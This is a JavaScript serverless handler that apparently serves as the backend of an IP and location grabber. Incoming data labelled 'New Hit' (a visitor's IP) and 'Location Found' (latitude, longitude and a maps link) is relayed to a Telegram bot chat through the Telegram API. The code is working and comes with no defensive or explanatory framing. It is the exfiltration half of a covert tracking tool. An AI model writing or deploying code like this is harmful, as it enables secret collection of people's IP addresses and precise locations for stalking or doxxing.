export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Error');

    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const data = req.body;
    let text = "";

    if (data.type === 'IP') {
        text = `🌐 *New Hit*\n📍 IP: \`${data.val}\`\n⏰ Date: 30 April 2026`;
    } else if (data.type === 'LOC') {
        text = `📍 *Location Found*\n▶️ Lat: \`${data.lat}\`\n▶️ Lon: \`${data.lon}\`\n🔗 [Maps Link](${data.map})`;
    } else {
        text = `⚠️ *Log:* ${data.msg}`;
    }

    try {
        const teleUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const response = await fetch(teleUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "Markdown"
            })
        });

        if (response.ok) {
            return res.status(200).json({ status: 'sent' });
        } else {
            return res.status(500).json({ status: 'tele_error' });
        }
    } catch (e) {
        return res.status(500).json({ status: 'server_error' });
    }
}
